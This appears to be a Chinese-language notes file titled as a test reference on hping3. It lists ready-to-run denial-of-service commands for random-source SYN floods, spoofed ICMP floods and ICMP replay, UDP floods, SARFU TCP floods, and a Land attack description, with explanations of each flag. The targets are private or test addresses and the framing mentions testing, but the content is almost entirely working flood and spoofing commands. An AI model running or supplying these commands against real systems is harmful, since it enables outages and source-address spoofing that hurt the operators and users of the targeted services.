# ref
```
DoS***方法（hping3） http://blog.51cto.com/19920624/1584465
hping3使用 https://mochazz.github.io/2017/07/23/hping3/

TCP Syn Flood Dos Attack hping3 Kali Linux 2018
https://www.youtube.com/watch?v=22O0rBx2h_g
```

```
根據底下資料進行測試報告
hping3使用 https://mochazz.github.io/2017/07/23/hping3/
```

# 攻擊範例
```
1、DOS with random source IP

hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

參數含義：:
hping= 應用名稱.
-c 100000 =packets 發送的數量.
-d 120 = packet的大小.
-S = 只發送SYN packets.
-w 64 = TCP window的大小.
-p 21 = Destination port (21 being FTP port). 可以使用任意埠.
--flood = Sending packets as fast as possible, 不顯示回應. Flood mode.
--rand-source = 使用隨機的Source IP Addresses. 或者使用 -a or spoof to hide hostnames.
www.hping3testsite.com = Destination IP address or target machines IP address.
或者使用 一個網址 In my case resolves to 127.0.0.1 (as entered in /etc/hosts file)



2、ICMP flood
ICMP的洪水攻擊攻擊是在最小時間內發送最大的ICMP資料到目的機，例如使用ping指令。
在"舊"時代它使用一個巨大的ping（死亡之ping）是可能破壞機器，
希望這些時間已經過去，但它仍有可能攻擊任何機器的頻寬和處理時間，如果接受到這種ICMP資料包。

ICMP flood using hping 3 :
hping3 -q -n -a 10.0.0.1 --id 0 --icmp -d 56 --flood 192.168.0.2

-q 表示quiet, -n 表示無 name resolving, id 0 表示有ICMP echo request (ping)
-d i表示包的大小 (56 is the normal size for a ping).
某些系統組態中自動地丟棄這種通過hping生成的頭部設定不正確的ICMP包（例如不可能設置帶順序的ID）。
在這種情況下，您可以使用Wireshark嗅探正常的ICMP回應要求封包，將其保存為二進位檔案，並使用hping3重播。

Example:
hping3 -q -n --rawip -a 10.0.0.1 --ipproto 1 --file "./icmp_echo_request.bin" -d 64 --flood 192.168.0.2


3、UDP flood
這是相同的概念ICMP洪水攻擊除非你發送大量的UDP資料。 UDP洪水攻擊對網路頻寬非常危險的。
Generating UDP flood:
hping3 -q -n -a 10.0.0.1 --udp -s 53 --keep -p 68 --flood 192.168.0.2
對於UDP，你必須精確的知道源和目的埠，這裡我選擇了DNS和BOOTPC（的dhclient）埠。
該BOOTPC（68）埠經常在個人電腦開著，因為大多數人使用DHCP來自己連接到網路。


4、SYN flood
SYN洪水攻擊是最常用的掃描技術，以及這樣做的原因是因為它是最危險的。 
SYN洪水攻擊在於發送大量的TCP資料包只有SYN標誌。
因為SYN封包用來打開一個TCP連接，受害人的主機將嘗試打開這些連接。這些連接，存儲的連接表中，將繼續開放一定的時間，
而攻擊者不斷湧入與SYN資料包。一旦受害者的連接表被填滿時，它不會接受任何新的連接，因此，如果它是一個伺服器這意味著它已不再被任何人訪問。

Example of a SYN flood attack :
hping3 -q -n -a 10.0.0.1 -S -s 53 --keep -p 22 --flood 192.168.0.2

5、Other TCP flood attacks
有許多使用TCP洪水攻擊的可能性。如你所願剛才設置的各種TCP標誌。
某些TCP洪水攻擊技術包括制定了很多不尋常的標誌擾亂。例如與SARFU掃描

Example with the SARFU scan :
hping3 -q -n -a 10.0.0.1 -SARFU -p 22 --flood 192.168.0.2


6、Land攻擊
Land攻擊原理是：用一個特別打造的SYN包，它的原位址和目標位址都被設置成某一個伺服器位址。
此舉將導致接受伺服器向它自己的位址發送SYN-ACK消息，結果這個位址又發回ACK消息並創建一個空連接。
被攻擊的伺服器每接收一個這樣的連接都將保留，直到超時，對Land攻擊反應不同，許多UNIX實現將崩潰，NT變的極其緩慢(大約持續5分鐘)


```
